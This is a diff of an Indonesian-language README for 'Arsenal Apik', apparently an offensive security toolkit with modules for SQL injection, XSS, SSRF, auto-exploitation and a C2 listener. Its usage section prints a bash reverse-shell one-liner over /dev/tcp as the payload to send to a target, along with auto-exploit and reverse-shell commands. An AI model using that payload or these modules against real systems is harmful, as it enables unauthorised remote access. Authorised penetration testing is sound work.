@@ -1,38 +1,67 @@
-# Arsenal Apik
+**Custom Security Arsenal — 39 Modules for Red Team, Bug Bounty, and Penetration Testing.**
 
-Arsenal Apik adalah kumpulan tools keamanan custom yang dirancang untuk bug bounty hunter, red team, dan penetration tester.  
-Semua module ditulis dari 0 — bukan wrapper, bukan fork.
+Arsenal Apik adalah kumpulan tools keamanan custom yang ditulis dari 0. Bukan wrapper, bukan fork. Dirancang untuk profesional keamanan siber yang membutuhkan fleksibilitas dan kecepatan dalam pengujian penetrasi.
 
 ---
 
-## Fitur
+## 📦 Fitur
 
 - 39 module siap pakai
-- Support SQL injection, XSS, SSRF, SSTI, reverse shell, upload shell, dan banyak lagi
-- Auto-exploit: scan + exploit otomatis dalam 1 perintah
-- Dashboard web untuk monitoring hasil scan
-- C2 listener untuk reverse shell
+- SQL injection, XSS, SSRF, SSTI, GraphQL, Deserialization, Auth Bypass
+- Reverse shell generator (multi-platform)
+- Auto-exploit: scan + exploit otomatis
+- C2 Listener untuk reverse shell
+- Dashboard web untuk monitoring
 - Output JSON, Markdown, atau teks biasa
-- Ringan, bisa dijalankan di Termux (Android) maupun VPS
+- Berjalan di Linux, macOS, Windows (WSL), dan Termux (Android)
+- Ringan & cepat
 
 ---
 
-## Instalasi
+## 🖥️ Instalasi
+
+### 🔹 Linux / macOS / WSL
 
 ```bash
+# Clone repository
+git clone https://github.com/seala4ngel/angelmind.git
+cd angelmind
+
+# Install dependencies
+pip3 install -r requirements.txt
+```
+
+🔹 Kali Linux / Parrot OS
+
+```bash
+sudo apt update
+sudo apt install python3 python3-pip git -y
+git clone https://github.com/seala4ngel/angelmind.git
+cd angelmind
+pip3 install -r requirements.txt
+```
+
+🔹 Termux (Android)
+
+```bash
+pkg update && pkg upgrade -y
+pkg install python python-pip git -y
 git clone https://github.com/seala4ngel/angelmind.git
 cd angelmind
 pip install -r requirements.txt
+```
 
-Cara Pakai
+---
 
-Format perintah:
+🚀 Cara Pakai
+
+Format Perintah
 
 ```bash
 python run.py --module [nama_module] --target [target] [opsi_tambahan]
 ```
 
-Contoh penggunaan
+Contoh Penggunaan
 
 ```bash
 # SQL injection
@@ -43,19 +72,14 @@ python run.py --module revshell --target example.com --ip 0.0.0.0 --port 4444 --
 
 # Auto-exploit (scan + exploit otomatis)
 python run.py --module auto_exploit --target http://testphp.vulnweb.com
-```
 
-Cek daftar semua module dan opsi:
-
-```bash
+# Lihat semua module
 python run.py --help
 ```
 
 ---
 
-Output
-
-Hasil scan bisa ditampilkan dalam 3 format:
+📊 Output Format
 
 ```bash
 # JSON (default)
@@ -70,37 +94,35 @@ python run.py --module sqli --target http://testphp.vulnweb.com --param id --out
 
 ---
 
-Dashboard Web
-
-Untuk melihat hasil scan di browser:
+🖥️ Dashboard Web
 
 ```bash
 python dashboard_app.py
 ```
 
-Lalu buka http://localhost:5001 di browser.
+Buka http://localhost:5001 di browser.
 
 ---
 
-C2 Listener (Reverse Shell)
+📡 C2 Listener (Reverse Shell)
 
-1. Jalankan listener di terminal 1:
+Terminal 1 — Listener
 
 ```bash
 python listener.py 9999
 ```
 
-2. Di terminal 2, kirim payload ke target (contoh):
+Terminal 2 — Kirim Payload
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'
 ```
 
-3. Kalo berhasil, di terminal 1 kamu bakal dapet shell.
+Jika berhasil, di terminal 1 akan muncul shell.
 
 ---
 
-Daftar Module
+📋 Daftar Module
 
 Kategori Module Priority
 Exploit sqli, xss, ssrf, ssti, graphql, deser, authbypass, chain, vulntrigger P2-P3
@@ -116,30 +138,29 @@ Priority: P1 = Critical, P5 = Informasi
 
 ---
 
-Catatan Penting
+⚠️ Catatan Penting
 
 · Tools ini hanya untuk red team, bug bounty, dan penetration testing yang sah.
-· Gunakan hanya pada target yang memiliki izin.
+· Gunakan hanya pada target yang memiliki izin tertulis.
 · Penulis tidak bertanggung jawab atas penyalahgunaan.
 
 ---
 
-Kontribusi
+🤝 Kontribusi
 
-Kalo mau nambah module atau lapor bug, buka issue atau pull request di GitHub.
+Jika ingin menambahkan module atau melaporkan bug:
 
----
-
-Lisensi
-
-MIT
+· Buka Issue di GitHub
+· Atau kirim Pull Request
 
 ---
 
-Dibuat oleh
+📄 Lisensi
+
+MIT License
+
+---
+
+👤 Dibuat oleh
 
 seala4ngel
-
-```
-
----
